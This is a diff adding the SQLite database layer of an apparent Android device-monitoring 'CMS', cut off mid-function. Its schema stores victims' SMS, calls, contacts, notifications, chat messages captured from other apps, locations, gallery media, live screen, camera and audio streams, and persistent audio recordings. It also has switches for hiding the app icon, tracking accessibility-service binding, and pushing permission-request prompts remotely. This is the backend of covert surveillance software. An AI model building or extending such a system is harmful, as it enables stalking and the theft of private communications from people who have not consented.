@@ -1,0 +1,1064 @@
+"""
+database.py — SQLite Database Layer for DeviceMgr CMS
+
+FIX APPLIED:
+  query_db() now ALWAYS returns plain Python dicts (or list[dict]).
+  sqlite3.Row objects are converted at the boundary and never leak
+  to callers. This eliminates ALL AttributeError: 'sqlite3.Row' has
+  no attribute 'get' errors throughout the codebase.
+"""
+
+import sqlite3
+import os
+from datetime import datetime, timezone
+from flask import g
+from config import Config
+
+
+# ── CONNECTION MANAGEMENT ─────────────────────────────────────────────────
+
+def get_db():
+    """Return the SQLite connection for the current request (g-cached)."""
+    if "db" not in g:
+        g.db = sqlite3.connect(
+            Config.DATABASE_PATH,
+            detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES,
+            check_same_thread=False,
+        )
+        # Use Row factory inside the connection for column-name access,
+        # but we convert to dict before returning from query_db().
+        g.db.row_factory = sqlite3.Row
+        g.db.execute("PRAGMA journal_mode=WAL")
+        g.db.execute("PRAGMA foreign_keys=ON")
+    return g.db
+
+
+def close_db(e=None):
+    """Close connection at end of request (registered as Flask teardown)."""
+    db = g.pop("db", None)
+    if db is not None:
+        db.close()
+
+
+def _row_to_dict(row):
+    """Convert a sqlite3.Row to a plain dict. Safe if already a dict or None."""
+    if row is None:
+        return None
+    if isinstance(row, dict):
+        return row
+    return dict(row)
+
+
+def query_db(query, args=(), one=False):
+    """
+    Execute a SELECT and return plain Python dicts — NEVER sqlite3.Row objects.
+
+    Args:
+        query: SQL string
+        args:  parameter tuple (prevents SQL injection)
+        one:   True  → return dict | None
+               False → return list[dict]
+    """
+    cur = get_db().execute(query, args)
+    rows = cur.fetchall()
+    cur.close()
+    if one:
+        return _row_to_dict(rows[0]) if rows else None
+    return [_row_to_dict(r) for r in rows]
+
+
+def execute_db(query, args=()):
+    """Execute INSERT/UPDATE/DELETE and commit. Returns lastrowid."""
+    db = get_db()
+    cur = db.execute(query, args)
+    db.commit()
+    return cur.lastrowid
+
+
+def executemany_db(query, args_list):
+    """Batch INSERT/UPDATE in a single transaction."""
+    db = get_db()
+    db.executemany(query, args_list)
+    db.commit()
+
+
+def now_utc():
+    """Current UTC time as ISO 8601 string."""
+    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
+
+
+# ── SCHEMA ────────────────────────────────────────────────────────────────
+
+SCHEMA_SQL = """
+CREATE TABLE IF NOT EXISTS users (
+    id            INTEGER PRIMARY KEY AUTOINCREMENT,
+    username      TEXT    UNIQUE NOT NULL,
+    password_hash TEXT    NOT NULL,
+    created_at    TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    updated_at    TEXT,
+    last_login    TEXT,
+    is_active     INTEGER DEFAULT 1
+);
+
+CREATE TABLE IF NOT EXISTS devices (
+    device_id        TEXT    PRIMARY KEY,
+    device_name      TEXT,
+    manufacturer     TEXT,
+    model            TEXT,
+    android_version  TEXT,
+    sdk_version      INTEGER,
+    app_version      TEXT,
+    battery          INTEGER,
+    charging         INTEGER DEFAULT 0,
+    ram_total_mb     INTEGER,
+    ram_used_mb      INTEGER,
+    storage_total_mb INTEGER,
+    storage_used_mb  INTEGER,
+    network_type     TEXT,
+    screen_width     INTEGER,
+    screen_height    INTEGER,
+    cpu_abi          TEXT,
+    security_patch   TEXT,
+    last_heartbeat   TEXT,
+    status           TEXT    DEFAULT 'offline',
+    ip_address       TEXT,
+    created_at       TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    updated_at       TEXT,
+    foreground_mode_enabled INTEGER DEFAULT 1,
+    app_icon_visible INTEGER DEFAULT 1,
+    fcm_commands_enabled INTEGER DEFAULT 0,
+    server_slot       INTEGER DEFAULT 1,
+    server_routing_mode TEXT DEFAULT 'auto',
+    management_state TEXT DEFAULT 'active',
+    paused_at TEXT,
+    decommissioned_at TEXT,
+    management_state_updated_at TEXT
+);
+
+CREATE TABLE IF NOT EXISTS api_tokens (
+    id         INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id  TEXT    NOT NULL,
+    token      TEXT    NOT NULL UNIQUE,
+    expires_at TEXT,
+    created_at TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    last_used  TEXT,
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_tokens_device ON api_tokens(device_id);
+CREATE INDEX IF NOT EXISTS idx_tokens_token  ON api_tokens(token);
+
+CREATE TABLE IF NOT EXISTS notifications (
+    id            INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id     TEXT    NOT NULL,
+    app_name      TEXT,
+    title         TEXT,
+    message       TEXT,
+    received_time TEXT,
+    synced_at     TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_notif_device ON notifications(device_id);
+CREATE INDEX IF NOT EXISTS idx_notif_time   ON notifications(received_time);
+CREATE INDEX IF NOT EXISTS idx_notif_app    ON notifications(app_name);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_notif_dedup
+    ON notifications(device_id, app_name, received_time, title, message);
+
+CREATE TABLE IF NOT EXISTS notification_ignore_rules (
+    id              INTEGER PRIMARY KEY AUTOINCREMENT,
+    app_name        TEXT    NOT NULL,
+    title           TEXT    NOT NULL,
+    message_pattern TEXT    NOT NULL,
+    created_at      TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))
+);
+CREATE INDEX IF NOT EXISTS idx_notif_ignore_app
+    ON notification_ignore_rules(app_name);
+CREATE INDEX IF NOT EXISTS idx_notif_ignore_title
+    ON notification_ignore_rules(title);
+
+CREATE TABLE IF NOT EXISTS sms (
+    id           INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id    TEXT    NOT NULL,
+    phone_number TEXT,
+    contact_name TEXT,
+    direction    TEXT    CHECK(direction IN ('incoming','outgoing')),
+    message      TEXT,
+    message_time TEXT,
+    synced_at    TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_sms_device ON sms(device_id);
+CREATE INDEX IF NOT EXISTS idx_sms_time   ON sms(message_time);
+CREATE INDEX IF NOT EXISTS idx_sms_phone  ON sms(phone_number);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_sms_dedup
+    ON sms(device_id, phone_number, direction, message_time, message);
+
+CREATE TABLE IF NOT EXISTS call_logs (
+    id           INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id    TEXT    NOT NULL,
+    phone_number TEXT,
+    contact_name TEXT,
+    duration     INTEGER DEFAULT 0,
+    call_type    TEXT,
+    call_time    TEXT,
+    synced_at    TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_calls_device ON call_logs(device_id);
+CREATE INDEX IF NOT EXISTS idx_calls_time   ON call_logs(call_time);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_calls_dedup
+    ON call_logs(device_id, phone_number, call_time, call_type, duration);
+
+CREATE TABLE IF NOT EXISTS contacts (
+    id         INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id  TEXT    NOT NULL,
+    name       TEXT,
+    phone      TEXT,
+    email      TEXT,
+    updated_at TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_contacts_device ON contacts(device_id);
+
+CREATE TABLE IF NOT EXISTS contacts_sync_state (
+    device_id   TEXT PRIMARY KEY,
+    initialized INTEGER NOT NULL DEFAULT 0,
+    last_sync_at TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+
+CREATE TABLE IF NOT EXISTS contact_changes (
+    id           INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id    TEXT NOT NULL,
+    change_type  TEXT NOT NULL CHECK(change_type IN ('new','deleted')),
+    name         TEXT,
+    phone        TEXT,
+    email        TEXT,
+    contact_key  TEXT NOT NULL,
+    changed_at   TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_contact_changes_device ON contact_changes(device_id);
+CREATE INDEX IF NOT EXISTS idx_contact_changes_type ON contact_changes(change_type);
+CREATE INDEX IF NOT EXISTS idx_contact_changes_time ON contact_changes(changed_at);
+
+CREATE TABLE IF NOT EXISTS commands (
+    command_id   INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id    TEXT    NOT NULL,
+    command_type TEXT    NOT NULL,
+    status       TEXT    DEFAULT 'pending'
+                         CHECK(status IN ('pending','downloaded','running',
+                                          'completed','failed','cancelled')),
+    progress     INTEGER DEFAULT 0,
+    parameters   TEXT,
+    result       TEXT,
+    error        TEXT,
+    created_at   TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    started_at   TEXT,
+    completed_at TEXT,
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_cmd_device ON commands(device_id);
+CREATE INDEX IF NOT EXISTS idx_cmd_status ON commands(status);
+CREATE INDEX IF NOT EXISTS idx_cmd_time   ON commands(created_at);
+
+CREATE TABLE IF NOT EXISTS live_sessions (
+    session_id       TEXT    PRIMARY KEY,
+    device_id        TEXT    NOT NULL,
+    stream_type      TEXT    NOT NULL
+                            CHECK(stream_type IN ('screen', 'camera', 'audio')),
+    capture_method   TEXT,
+    camera_facing    TEXT,
+    status           TEXT    NOT NULL DEFAULT 'requested'
+                            CHECK(status IN ('requested', 'active',
+                                             'stopped', 'failed')),
+    requested_fps    INTEGER,
+    start_command_id INTEGER,
+    stop_command_id  INTEGER,
+    error            TEXT,
+    created_at       TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    started_at       TEXT,
+    stopped_at       TEXT,
+    last_activity_at TEXT,
+    FOREIGN KEY (device_id)
+        REFERENCES devices(device_id) ON DELETE CASCADE,
+    FOREIGN KEY (start_command_id)
+        REFERENCES commands(command_id) ON DELETE SET NULL,
+    FOREIGN KEY (stop_command_id)
+        REFERENCES commands(command_id) ON DELETE SET NULL
+);
+CREATE INDEX IF NOT EXISTS idx_live_sessions_device
+    ON live_sessions(device_id);
+CREATE INDEX IF NOT EXISTS idx_live_sessions_status
+    ON live_sessions(status);
+CREATE INDEX IF NOT EXISTS idx_live_sessions_created
+    ON live_sessions(created_at);
+
+CREATE TABLE IF NOT EXISTS activity_logs (
+    id         INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id  TEXT,
+    category   TEXT,
+    action     TEXT    NOT NULL,
+    result     TEXT,
+    details    TEXT,
+    ip_address TEXT,
+    created_at TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))
+);
+CREATE INDEX IF NOT EXISTS idx_alog_device   ON activity_logs(device_id);
+CREATE INDEX IF NOT EXISTS idx_alog_time     ON activity_logs(created_at);
+CREATE INDEX IF NOT EXISTS idx_alog_category ON activity_logs(category);
+
+CREATE TABLE IF NOT EXISTS error_logs (
+    id         INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id  TEXT,
+    module     TEXT,
+    error_type TEXT,
+    message    TEXT,
+    stacktrace TEXT,
+    resolved   INTEGER DEFAULT 0,
+    created_at TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))
+);
+CREATE INDEX IF NOT EXISTS idx_elog_device ON error_logs(device_id);
+CREATE INDEX IF NOT EXISTS idx_elog_time   ON error_logs(created_at);
+
+CREATE TABLE IF NOT EXISTS gallery_metadata (
+    image_id       TEXT    PRIMARY KEY,
+    device_id      TEXT    NOT NULL,
+    display_name   TEXT,
+    mime_type      TEXT,
+    media_type     TEXT    DEFAULT 'image',
+    width          INTEGER,
+    height         INTEGER,
+    duration_ms    INTEGER,
+    file_size      INTEGER,
+    date_taken     TEXT,
+    last_requested TEXT,
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_gallery_device ON gallery_metadata(device_id);
+
+CREATE TABLE IF NOT EXISTS temp_files (
+    id         INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id  TEXT,
+    file_type  TEXT    CHECK(file_type IN
+                       ('screenshot','camera','gallery','video','audio','download')),
+    filename   TEXT    NOT NULL,
+    path       TEXT    NOT NULL,
+    size_bytes INTEGER DEFAULT 0,
+    expires_at TEXT    NOT NULL,
+    created_at TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))
+);
+CREATE INDEX IF NOT EXISTS idx_temp_expires ON temp_files(expires_at);
+CREATE INDEX IF NOT EXISTS idx_temp_device  ON temp_files(device_id);
+
+CREATE TABLE IF NOT EXISTS settings (
+    id                       INTEGER PRIMARY KEY DEFAULT 1,
+    server_url               TEXT,
+    heartbeat_interval       INTEGER DEFAULT 60,
+    retry_interval           INTEGER DEFAULT 300,
+    storage_limit_mb         INTEGER DEFAULT 400,
+    temp_file_lifetime_hours INTEGER DEFAULT 24,
+    log_retention_days       INTEGER DEFAULT 30,
+    heartbeat_timeout        INTEGER DEFAULT 180,
+    updated_at               TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    server1_url              TEXT,
+    server2_url              TEXT,
+    server3_url              TEXT,
+    server4_url              TEXT,
+    server5_url              TEXT,
+    server6_url              TEXT
+);
+
+CREATE TABLE IF NOT EXISTS storage_stats (
+    id                   INTEGER PRIMARY KEY AUTOINCREMENT,
+    used_storage_mb      REAL    DEFAULT 0,
+    temporary_storage_mb REAL    DEFAULT 0,
+    permanent_storage_mb REAL    DEFAULT 0,
+    last_calculated      TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))
+);
+
+CREATE TABLE IF NOT EXISTS locations (
+    id          INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id   TEXT    NOT NULL,
+    latitude    REAL,
+    longitude   REAL,
+    accuracy_m  REAL,
+    altitude_m  REAL,
+    speed_ms    REAL,
+    recorded_at TEXT,
+    synced_at   TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_loc_device ON locations(device_id);
+
+CREATE TABLE IF NOT EXISTS communication_activity (
+    id           INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id    TEXT NOT NULL,
+    package_name TEXT NOT NULL,
+    app_name     TEXT NOT NULL,
+    chat_name    TEXT NOT NULL DEFAULT 'Unknown',
+    direction    TEXT NOT NULL CHECK(direction IN ('sent','received','visited')),
+    content      TEXT NOT NULL,
+    event_time   INTEGER NOT NULL,
+    synced_at    TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_comm_device ON communication_activity(device_id);
+CREATE INDEX IF NOT EXISTS idx_comm_app ON communication_activity(package_name);
+CREATE INDEX IF NOT EXISTS idx_comm_chat ON communication_activity(chat_name);
+CREATE INDEX IF NOT EXISTS idx_comm_time ON communication_activity(event_time);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_comm_dedup
+    ON communication_activity(device_id, package_name, chat_name, direction, content, event_time);
+
+CREATE TABLE IF NOT EXISTS app_usage_sessions (
+    id             INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id      TEXT    NOT NULL,
+    package_name   TEXT    NOT NULL,
+    app_name       TEXT    NOT NULL,
+    start_time     INTEGER NOT NULL,
+    end_time       INTEGER,
+    duration_ms    INTEGER NOT NULL DEFAULT 0,
+    screen_on      INTEGER NOT NULL DEFAULT 1,
+    device_locked  INTEGER NOT NULL DEFAULT 0,
+    synced_at      TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_app_usage_device   ON app_usage_sessions(device_id);
+CREATE INDEX IF NOT EXISTS idx_app_usage_start    ON app_usage_sessions(start_time);
+CREATE INDEX IF NOT EXISTS idx_app_usage_package  ON app_usage_sessions(package_name);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_app_usage_dedup
+    ON app_usage_sessions(device_id, package_name, start_time);
+
+CREATE TABLE IF NOT EXISTS app_usage_ignored_apps (
+    package_name TEXT PRIMARY KEY,
+    app_name     TEXT NOT NULL,
+    ignored_at   TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))
+);
+CREATE INDEX IF NOT EXISTS idx_app_usage_ignored_name
+    ON app_usage_ignored_apps(app_name);
+
+CREATE TABLE IF NOT EXISTS app_install_history (
+    id             INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id      TEXT NOT NULL,
+    package_name   TEXT NOT NULL,
+    app_name       TEXT NOT NULL,
+    version_name   TEXT,
+    version_code   INTEGER,
+    event_type     TEXT NOT NULL CHECK(event_type IN ('INSTALLED','UNINSTALLED')),
+    event_time     INTEGER NOT NULL,
+    local_id       TEXT,
+    created_at     TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_app_install_device ON app_install_history(device_id);
+CREATE INDEX IF NOT EXISTS idx_app_install_time ON app_install_history(event_time);
+CREATE INDEX IF NOT EXISTS idx_app_install_package ON app_install_history(package_name);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_app_install_dedup
+    ON app_install_history(device_id, package_name, event_type, event_time, local_id);
+
+
+CREATE TABLE IF NOT EXISTS device_media (
+    id             INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id      TEXT    NOT NULL,
+    media_type     TEXT    NOT NULL,
+    file_name      TEXT    NOT NULL,
+    file_path      TEXT    NOT NULL,
+    thumbnail_path TEXT,
+    mime_type      TEXT,
+    file_size      INTEGER DEFAULT 0,
+    command_id     INTEGER,
+    uploaded_at    TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (device_id)  REFERENCES devices(device_id)  ON DELETE CASCADE,
+    FOREIGN KEY (command_id) REFERENCES commands(command_id) ON DELETE SET NULL
+);
+CREATE INDEX IF NOT EXISTS idx_media_device    ON device_media(device_id);
+CREATE INDEX IF NOT EXISTS idx_media_type      ON device_media(media_type);
+CREATE INDEX IF NOT EXISTS idx_media_uploaded  ON device_media(uploaded_at);
+CREATE INDEX IF NOT EXISTS idx_media_command   ON device_media(command_id);
+
+CREATE TABLE IF NOT EXISTS device_messages (
+    id          INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id   TEXT    NOT NULL,
+    title       TEXT    NOT NULL,
+    description TEXT,
+    priority    TEXT    NOT NULL DEFAULT 'normal'
+                        CHECK(priority IN ('low','normal','high','urgent')),
+    dismissible INTEGER NOT NULL DEFAULT 1,
+    vibration   TEXT    NOT NULL DEFAULT 'standard'
+                        CHECK(vibration IN ('standard','strong')),
+    status      TEXT    NOT NULL DEFAULT 'pending'
+                        CHECK(status IN ('draft','pending','sent','delivered','read','expired','failed')),
+    created_at  TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    expires_at  TEXT    NOT NULL,
+    sent_at     TEXT,
+    FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS idx_msg_device  ON device_messages(device_id);
+CREATE INDEX IF NOT EXISTS idx_msg_status  ON device_messages(status);
+CREATE INDEX IF NOT EXISTS idx_msg_expires ON device_messages(expires_at);
+
+CREATE TABLE IF NOT EXISTS sms_permanent (
+    sms_id     INTEGER PRIMARY KEY,
+    saved_at   TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (sms_id) REFERENCES sms(id) ON DELETE CASCADE
+);
+
+CREATE TABLE IF NOT EXISTS notifications_permanent (
+    notif_id   INTEGER PRIMARY KEY,
+    saved_at   TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    FOREIGN KEY (notif_id) REFERENCES notifications(id) ON DELETE CASCADE
+);
+
+CREATE TABLE IF NOT EXISTS live_sessions (
+    session_id       TEXT PRIMARY KEY,
+    device_id        TEXT NOT NULL,
+    stream_type      TEXT NOT NULL,
+    capture_method   TEXT,
+    camera_facing    TEXT,
+    requested_fps    INTEGER DEFAULT 3,
+    status           TEXT NOT NULL DEFAULT 'requested',
+    error            TEXT,
+    created_at       TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now')),
+    started_at       TEXT,
+    stopped_at       TEXT,
+    last_activity_at TEXT,
+    FOREIGN KEY (device_id)
+        REFERENCES devices(device_id)
+        ON DELETE CASCADE
+);
+
+CREATE INDEX IF NOT EXISTS idx_live_sessions_device
+    ON live_sessions(device_id);
+
+CREATE INDEX IF NOT EXISTS idx_live_sessions_status
+    ON live_sessions(status);
+
+CREATE INDEX IF NOT EXISTS idx_live_sessions_created
+    ON live_sessions(created_at);
+
+CREATE TABLE IF NOT EXISTS persistent_audio_recordings (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+
+    recording_id TEXT UNIQUE NOT NULL,
+
+    device_id TEXT NOT NULL,
+
+    session_id TEXT,
+
+    display_name TEXT NOT NULL,
+
+    file_path TEXT NOT NULL,
+
+    mime_type TEXT DEFAULT 'audio/wav',
+
+    size_bytes INTEGER DEFAULT 0,
+
+    duration_ms INTEGER DEFAULT 0,
+
+    status TEXT NOT NULL
+        DEFAULT 'recording'
+        CHECK (
+            status IN (
+                'recording',
+                'completed',
+                'failed'
+            )
+        ),
+
+    created_at TEXT,
+
+    completed_at TEXT,
+
+    updated_at TEXT
+);
+
+
+CREATE INDEX IF NOT EXISTS
+idx_persistent_audio_device
+ON persistent_audio_recordings(
+    device_id
+);
+
+
+CREATE INDEX IF NOT EXISTS
+idx_persistent_audio_status
+ON persistent_audio_recordings(
+    status
+);
+
+
+CREATE INDEX IF NOT EXISTS
+idx_persistent_audio_created
+ON persistent_audio_recordings(
+    created_at
+);
+"""
+
+def _migrate_notification_ignore_rules(conn):
+    """Ensure CMS-side notification ignore rules exist."""
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS notification_ignore_rules (
+            id              INTEGER PRIMARY KEY AUTOINCREMENT,
+            app_name        TEXT    NOT NULL,
+            title           TEXT    NOT NULL,
+            message_pattern TEXT    NOT NULL,
+            created_at      TEXT    DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ','now'))
+        )
+    """)
+    conn.execute("""
+        CREATE INDEX IF NOT EXISTS idx_notif_ignore_app
+        ON notification_ignore_rules(app_name)
+    """)
+    conn.execute("""
+        CREATE INDEX IF NOT EXISTS idx_notif_ignore_title
+        ON notification_ignore_rules(title)
+    """)
+    conn.commit()
+
+
+def _migrate_permission_notification_settings(conn):
+    """Add CMS-controlled permission-notification settings."""
+    columns = {
+        row["name"]
+        for row in conn.execute(
+            "PRAGMA table_info(device_messages)"
+        ).fetchall()
+    }
+
+    if "dismissible" not in columns:
+        conn.execute(
+            "ALTER TABLE device_messages "
+            "ADD COLUMN dismissible INTEGER NOT NULL DEFAULT 1"
+        )
+
+    if "vibration" not in columns:
+        conn.execute(
+            "ALTER TABLE device_messages "
+            "ADD COLUMN vibration TEXT NOT NULL DEFAULT 'standard'"
+        )
+
+    conn.commit()
+
+
+def _migrate_message_types(conn):
+    """
+    Add message classification fields used by CMS-controlled FCM
+    permission-request notifications.
+    """
+    columns = {
+        row["name"]
+        for row in conn.execute(
+            "PRAGMA table_info(device_messages)"
+        ).fetchall()
+    }
+
+    if "message_type" not in columns:
+        conn.execute(
+            "ALTER TABLE device_messages "
+            "ADD COLUMN message_type TEXT DEFAULT 'normal'"
+        )
+
+    if "permission_type" not in columns:
+        conn.execute(
+            "ALTER TABLE device_messages "
+            "ADD COLUMN permission_type TEXT"
+        )
+
+    conn.commit()
+
+
+def _migrate_device_ui_state(conn):
+    """
+    Add persisted CMS-controlled device UI state columns to existing databases.
+    SQLite CREATE TABLE IF NOT EXISTS does not add columns to an existing table.
+    """
+    columns = {
+        row["name"]
+        for row in conn.execute("PRAGMA table_info(devices)").fetchall()
+    }
+
+    if "foreground_mode_enabled" not in columns:
+        conn.execute(
+            "ALTER TABLE devices "
+            "ADD COLUMN foreground_mode_enabled INTEGER DEFAULT 1"
+        )
+
+    if "app_icon_visible" not in columns:
+        conn.execute(
+            "ALTER TABLE devices "
+            "ADD COLUMN app_icon_visible INTEGER DEFAULT 1"
+        )
+
+    conn.commit()
+
+def _migrate_runtime_state(conn):
+    """
+    Add runtime-state fields used by the device heartbeat.
+
+    These fields represent what DeviceMgr is currently using:
+    - camera
+    - microphone
+    - current foreground application
+    """
+
+    columns = {
+        "camera_active": "INTEGER DEFAULT 0",
+        "microphone_active": "INTEGER DEFAULT 0",
+        "current_app": "TEXT",
+    }
+
+    existing = {
+        row[1]
+        for row in conn.execute(
+            "PRAGMA table_info(devices)"
+        ).fetchall()
+    }
+
+    for column, definition in columns.items():
+        if column not in existing:
+            conn.execute(
+                f"ALTER TABLE devices ADD COLUMN {column} {definition}"
+            )
+
+    conn.commit()
+
+
+def _migrate_accessibility_binding_state(conn):
+    """Add the AccessibilityService connection state reported by heartbeat."""
+    columns = {
+        row["name"]
+        for row in conn.execute("PRAGMA table_info(devices)").fetchall()
+    }
+
+    if "accessibility_bound" not in columns:
+        conn.execute(
+            "ALTER TABLE devices ADD COLUMN accessibility_bound INTEGER DEFAULT 0"
+        )
+
+    conn.commit()
+
+
+def _migrate_live_sessions(conn):
+    """
+    Ensure an old/incomplete live_sessions table cannot prevent the
+    current schema from starting.
+
+    Earlier development versions may have created a live_sessions table
+    without the columns required by the current implementation.
+    SQLite's CREATE TABLE IF NOT EXISTS does not upgrade such a table.
+    """
+
+    existing = conn.execute(
+        """
+        SELECT name
+        FROM sqlite_master
+        WHERE type='table' AND name='live_sessions'
+        """
+    ).fetchone()
+
+    if not existing:
+        return
+
+    columns = {
+        row["name"]
+        for row in conn.execute("PRAGMA table_info(live_sessions)").fetchall()
+    }
+
+    required_columns = {
+        "session_id",
+        "device_id",
+        "stream_type",
+        "capture_method",
+        "camera_facing",
+        "status",
+        "requested_fps",
+        "start_command_id",
+        "stop_command_id",
+        "error",
+        "created_at",
+        "started_at",
+        "stopped_at",
+        "last_activity_at",
+    }
+
+    if required_columns.issubset(columns):
+        return
+
+    # Remove indexes that may have been created for the incompatible table.
+    conn.execute("DROP INDEX IF EXISTS idx_live_sessions_device")
+    conn.execute("DROP INDEX IF EXISTS idx_live_sessions_status")
+
+    # Preserve the old table instead of deleting it.
+    # It is renamed so the current schema can create a clean live_sessions table.
+    backup_name = (
+        "live_sessions_legacy_"
+        + datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    )
+
+    conn.execute(
+        f'ALTER TABLE live_sessions RENAME TO "{backup_name}"'
+    )
+
+    conn.commit()
+
+def _migrate_fcm_command_setting(conn):
+    """Add the per-device FCM command delivery setting."""
+
+    columns = {
+        row["name"]
+        for row in conn.execute(
+            "PRAGMA table_info(devices)"
+        ).fetchall()
+    }
+
+    if "fcm_commands_enabled" not in columns:
+        conn.execute(
+            "ALTER TABLE devices "
+            "ADD COLUMN fcm_commands_enabled INTEGER DEFAULT 0"
+        )
+
+    conn.commit()
+
+
+def _migrate_fcm_tokens(conn):
+    """
+    Add Firebase Cloud Messaging token columns to existing databases.
+
+    SQLite CREATE TABLE IF NOT EXISTS does not add new columns to an
+    already-existing devices table, so this migration keeps existing
+    installations compatible.
+    """
+
+    columns = {
+        row["name"]
+        for row in conn.execute(
+            "PRAGMA table_info(devices)"
+        ).fetchall()
+    }
+
+    if "fcm_token" not in columns:
+        conn.execute(
+            "ALTER TABLE devices "
+            "ADD COLUMN fcm_token TEXT"
+        )
+
+    if "fcm_token_updated_at" not in columns:
+        conn.execute(
+            "ALTER TABLE devices "
+            "ADD COLUMN fcm_token_updated_at TEXT"
+        )
+
+    conn.commit()
+
+def _migrate_fcm_recovery_state(conn):
+    """
+    Add persistent FCM recovery state columns to existing databases.
+
+    SQLite CREATE TABLE IF NOT EXISTS does not add columns to an
+    already-existing devices table, so these columns are migrated
+    explicitly.
+    """
+
+    columns = {
+        row["name"]
+        for row in conn.execute(
+            "PRAGMA table_info(devices)"
+        ).fetchall()
+    }
+
+    if "last_fcm_recovery_at" not in columns:
+        conn.execute(
+            "ALTER TABLE devices "
+            "ADD COLUMN last_fcm_recovery_at TEXT"
+        )
+
+    if "fcm_recovery_count" not in columns:
+        conn.execute(
+            "ALTER TABLE devices "
+            "ADD COLUMN fcm_recovery_count INTEGER DEFAULT 0"
+        )
+
+    conn.commit()
+
+def _migrate_fcm_recovery_mode(conn):
+    """
+    Add per-device FCM recovery mode.
+
+    Modes:
+        auto   - CMS automatically sends recovery FCM messages
+        manual - automatic recovery is disabled; operator controls it
+    """
+
+    columns = {
